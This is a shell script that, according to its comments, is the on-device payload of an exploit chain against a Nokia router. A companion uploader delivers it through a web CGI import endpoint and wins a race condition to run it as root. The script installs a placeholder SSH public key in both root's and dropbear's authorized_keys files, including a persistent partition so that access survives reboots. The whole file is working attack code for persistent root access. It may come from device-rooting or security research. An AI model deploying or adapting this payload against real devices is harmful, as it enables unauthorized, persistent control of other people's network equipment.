#!/bin/sh
# On-device payload — install the SSH public key for root, get a real root shell (uid=0 gid=0)
# run.py substitutes __PUBKEY__ / __TAG__, uploads it via usb_web_app.cgi?import,
# then races ?ping to catch a window where the script gets executed.
#
# PATH must be set explicitly: the /bin/sh spawned by ?ping uses a minimal PATH
# that does not include /usr/sbin.
# No sleep keep-alive needed — this only writes files, and they persist after the script exits.
PATH=/usr/sbin:/usr/bin:/sbin:/bin:/webs
export PATH
exec >/tmp/.nokiask.log 2>&1

echo "=== nokia sshkey payload ==="
id

# Write both drop points:
#   /root/.ssh/authorized_keys      — dropbear's per-user default location
#   /etc/dropbear/authorized_keys   — dropbear's system-level file; on this box
#                                     /etc/dropbear is a boot-time symlink ->
#                                     /configs/overlay/etc/dropbear (persistent
#                                     partition), so this is the copy that
#                                     actually survives a reboot (until factory reset).
# After a factory reset, only writing ~/.ssh fails authentication, so write
# both — whichever path dropbear honors is the one that works.
# If /etc/dropbear is a symlink to the persistent partition and the target is
# dangling, mkdir on the symlink itself fails, so follow readlink first and
# create the real target directory.
if [ -L /etc/dropbear ]; then
    _t=$(readlink /etc/dropbear)
    case "$_t" in /*) mkdir -p "$_t" 2>/dev/null ;; esac
fi

for d in /root/.ssh /etc/dropbear; do
    mkdir -p "$d"
    chmod 700 "$d"
    chown root:root "$d"            # critical: probe92 failed because this was root:appServi(ce) at the time
    touch "$d/authorized_keys"
    grep -q '__TAG__' "$d/authorized_keys" 2>/dev/null \
      || echo '__PUBKEY__' >> "$d/authorized_keys"
    chmod 600 "$d/authorized_keys"
    chown root:root "$d/authorized_keys"
done

ls -ld /root /root/.ssh /etc/dropbear
ls -l /root/.ssh/authorized_keys /etc/dropbear/authorized_keys
echo "=== done ==="
